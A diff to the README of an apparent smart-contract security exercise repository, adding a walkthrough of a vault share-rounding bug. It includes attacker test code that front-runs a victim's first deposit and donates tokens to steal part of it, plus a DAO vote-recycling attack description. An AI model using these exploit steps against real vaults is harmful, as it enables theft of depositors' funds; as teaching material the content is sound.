@@ -17,8 +17,17 @@ yarn build
 yarn test
 ```
 
-### test for DOS attack exercise 1
-Testing the DOS Attacks Exercise 1 located in `test/longer/3-dos-1.ts` takes a long time. Therefore, you should test only this exercise using `yarn dos1`
+### test for DOS attack exercise 1 and DAO attack exercise 2
+Testing the DOS Attacks Exercise 1 located in `test/longer/2-dao-attack-2.ts` and `test/longer/3-dos-1.ts` takes a so long time. Therefore, you should test only this exercise using `yarn dos1` or  `yarn dao2`.
+
+### test for Optimizer Vault exercise 1
+The converted TypeScript version of this test doesn't work. You should test it in a JavaScript environment.
+```shell
+cd javascript-ex
+yarn
+yarn build
+yarn test
+```
 
 ### CAUTION!
 These exercises include free RPC URLs to connect to the Ethereum mainnet and Goerli network. However, you may encounter rate limits for making calls in a short period. If something goes wrong during testing with `yarn test`, I recommend testing each test separately.
@@ -120,7 +129,7 @@ We have to calculate the voting power in transfer-like functions also.
 #### Exercise 2
 - [TheGridDAO.sol](contracts/2-dao-attack-2/TheGridDAO.sol)
 - [TheGridTreasury.sol](contracts/2-dao-attack-2/TheGridTreasury.sol)
-- [2-dao-attack-2.ts](test/2-dao-attack-2.ts)
+- [2-dao-attack-2.ts](test/longer/2-dao-attack-2.ts)
 
 ##### Attack Vector
 An attacker can get their proposal approved by transferring their deposit funds to a newly created temporary wallet and having that wallet vote for the proposal. The attacker can repeat this process by transferring the funds to another wallet, thereby accumulating enough votes to get the proposal approved.
@@ -358,6 +367,88 @@ require(success, "donation failed, couldn't send ETH");
 ```
 
 ---
+### Optimizer Vault
+
+#### Exercise 1
+- [OptimizerStrategy.sol](javascript-ex/contracts/6-optimizer-vault-1/OptimizerStrategy.sol)
+- [OptimizerStrategyManager.sol](javascript-ex/contracts/6-optimizer-vault-1/OptimizerStrategyManager.sol)
+- [OptimizerVault.sol](javascript-ex/contracts/6-optimizer-vault-1/OptimizerVault.sol)
+- [YieldContract.sol](javascript-ex/contracts/6-optimizer-vault-1/YieldContract.sol)
+
+##### build & test
+```shell
+cd javascript-ex
+yarn
+yarn build
+yarn vault1
+```
+
+##### Attack Vector
+```
+# OptimizerVault.sol
+
+function deposit(uint256 _amount) external nonReentrant {
+  uint256 _pool = balance();
+
+  want().safeTransferFrom(msg.sender, address(this), _amount); // @notice we do not check for deflationary tokens
+  sendToStrat();
+
+  uint256 shares = 0;
+  if (totalSupply() == 0) shares = _amount;
+  else shares = ((_amount * totalSupply()) / _pool);
+
+  uint256 total = totalSupply();
+
+  _mint(msg.sender, shares);
+}
+```
+The formula for calculating the share of newly deposited amounts is very vulnerable because it does not account for the remainder after dividing. If the shares are calculated to be 1.9, the result in Solidity is 1.
+
+The fomula like this.
+1. `total_share` : `total_pool` = **`deposit_share`** : `deposit_amount`
+2. **`deposit_share`** = `deposit_amount` * `total_share` / `total_pool`
+
+If an attacker knows the vulnerability, they can exploit the vault through **front-running** as follows.
+```
+# 6-optimizer-vault-1.js
+
+// Get all the tx's in the mempool
+const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
+  "pending",
+  true,
+]);
+
+// You see that bob is going to be the first depositor in the vault, with $200,000.
+const bobDeposit = pendingBlock.transactions.find((tx) => tx.to.toLowerCase() == this.vault.address.toLowerCase());
+
+// You front-run bob so that you are the first depositor
+await this.vault.connect(attacker).deposit(1, {
+  gasPrice: ethers.BigNumber.from(bobDeposit.gasPrice).add(1)
+});
+
+// You do something sneaky that allows you to take some of bob's funds!
+await this.usdc.connect(attacker).transfer(this.vault.address, ethers.utils.parseUnits("100000", 6), {
+  gasPrice: ethers.BigNumber.from(bobDeposit.gasPrice).add(1)
+});
+```
+
+These are the data values on `OptimizerVault`'s `deposit` function called in each transaction.
+| Tx         | total_pool | total_share | deposit_amount | deposit_share | memo             |
+| ---------- | ---------- | ----------- | -------------- | ------------- | ---------------- |
+| Attacker 1 | 0          | 0           | 1              | 1             | Initial data set |
+| Attacker 2 | 1          | 1           | 0              | 0             | No change        |
+| Bob        | 100,001    | 1           | 200,000        | 1             | Too small        |
+ 
+`1.999980000199998` (deposit_share) = `200,000` (deposit_amount) * `1` (total_share) / `100,001` (total_pool)
+However, `0.999980000199998` is discarded in Solidity.
+
+As a result, the attacker can retrieve approximately `$150,000` for an initial deposit of `$100,001`.
+
+##### Solution
+1. **Use a Higher Precision Library**: Utilize a higher precision arithmetic library, like Fixed-Point arithmetic libraries, to minimize the loss due to rounding errors.
+
+
+---
 ### Oracle Manipulation
 
 #### Exercise 1
@@ -411,7 +502,7 @@ Will be added soon.
 Will be added soon.
 
 ---
-### Reply Attack
+### Replay Attack
 Will be added soon.
 
 ---
